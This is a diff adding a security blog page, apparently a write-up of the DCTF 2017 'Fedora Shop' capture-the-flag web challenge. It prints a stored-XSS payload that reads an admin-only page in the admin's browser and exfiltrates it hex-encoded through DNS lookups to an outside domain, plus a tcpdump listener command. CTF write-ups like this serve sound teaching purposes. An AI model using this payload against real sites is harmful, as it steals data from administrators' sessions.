@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>[DCTF 2017] Fedora Shop Writeup</title>
+  <meta name="description" content="Description: After a series of attacks against their administrators they firewalled their facility. Will this stop you?">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://nitesculucian.github.io/2018/07/15/dctf-2017-fedora-shop-writeup/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
+
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:title" content="[DCTF 2017] Fedora Shop Writeup">
+  <meta name="twitter:description" content="Description: After a series of attacks against their administrators they firewalled their facility. Will this stop you?">
+  
+  
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">
+
+  
+  <!-- Google Analytics -->
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-107695141-1', 'auto');
+    ga('send', 'pageview');
+
+  </script>
+
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Lucian Nitescu</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/">Home</a>
+      
+        
+        <a class="page-link" href="/about/">Whoami</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+    </nav>
+    <br>Security Blog
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">[DCTF 2017] Fedora Shop Writeup</h1>
+    
+    <p class="post-meta"><time datetime="2018-07-15T11:29:00-03:00" itemprop="datePublished">Jul 15, 2018</time> •
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/dctf/">dctf</a>,
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/ctf/">ctf</a>,
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/writeups/">writeups</a>
+      
+    
+  
+
+
+
+</p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h3 id="description">Description:</h3>
+<p>After a series of attacks against their administrators they firewalled their facility. Will this stop you?</p>
+
+<p>https://fedora-shop.dctf-f1nals-2017.def.camp/</p>
+
+<h3 id="author">Author:</h3>
+<p>Lucian Nitescu, Anatol</p>
+
+<h3 id="stats">Stats:</h3>
+<p>374 point / 7 solvers</p>
+
+<h3 id="solution">Solution:</h3>
+
+<p>The challenge started with this simple website:</p>
+
+<p><img src="https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/1.png" alt="alt text" title="1" /></p>
+
+<p>When we send the order (on “Complete Order”) we can exploit an stored XSS vulnerability in the “Telephone” input field. Example:</p>
+
+<p><img src="https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/2.png" alt="alt text" title="2" /></p>
+
+<p>After “Complete Order”:</p>
+
+<p><img src="https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/3.png" alt="alt text" title="3" /></p>
+
+<p>Proof of stored XSS:</p>
+
+<p><img src="https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/4.png" alt="alt text" title="4" /></p>
+
+<p>On this page we can observe two important things. First we can see that our XSS vulnerability exploit was successful and that your order was visited by an admin and the status has been changed to “Shipped!” from “Pending approval”. But where is our flag?</p>
+
+<p>The flag is on “/admin.php” and can be accessed only by the admin. Example:</p>
+
+<p><img src="https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/5.png" alt="alt text" title="5" /></p>
+
+<p>Also any http request or ways of data exfil using stored XSS that require http request have been firewalled (as stated in the description of the challenge). One way of getting the flag from “admin.php” page is to use DNS requests on port 53. Example:</p>
+
+<p>On our exfil server we will listen for DNS requests using the following command:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump -vn udp port 53 -i ens3
+</code></pre></div></div>
+
+<p>As attack vector for only first 25 characters (50 hexa) of the flag we will use:</p>
+
+<ul>
+  <li>Note that the “Telephone” input has to be stored is the DB and should never exceed 255 characters.</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;setTimeout(function(){$.get('/admin.php',function(d){var h='';for(i=0;i&lt;d.length;i++){h+=("00"+d.charCodeAt(i).toString(16)).slice(-2);}$(document.body).append($('&lt;img&gt;').attr('src','//t'+h.substring(0,50)+'.dns.tux.ro'));});},999);&lt;/script&gt;
+</code></pre></div></div>
+
+<p>The above script will be executed when the Admin will visit the orders page and it will also send the DNS request to our server, which will look like:</p>
+
+<p><img src="https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/6.png" alt="alt text" title="6" /></p>
+
+<p>Which stands for:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lucian@nitescu:~$ python
+Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; buf = "444354467b3934366436636131366332663337306237343563"
+&gt;&gt;&gt; buf.decode("hex")
+'DCTF{946d6ca16c2f370b745c'
+&gt;&gt;&gt; 
+</code></pre></div></div>
+
+<p>Now we can just change the script to get the next 25 characters of the flag until we get this:</p>
+
+<p>DCTF{946d6ca16c2f370b745caf00f45ff2ac3656a3dcfee5d35cd8e853dc6d13470d}</p>
+
+  </div>
+
+  
+    <div class="post-comments" itemprop="comment">
+      <hr />
+<h1>Comments</h1>
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://nitesculucian.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    </div>
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
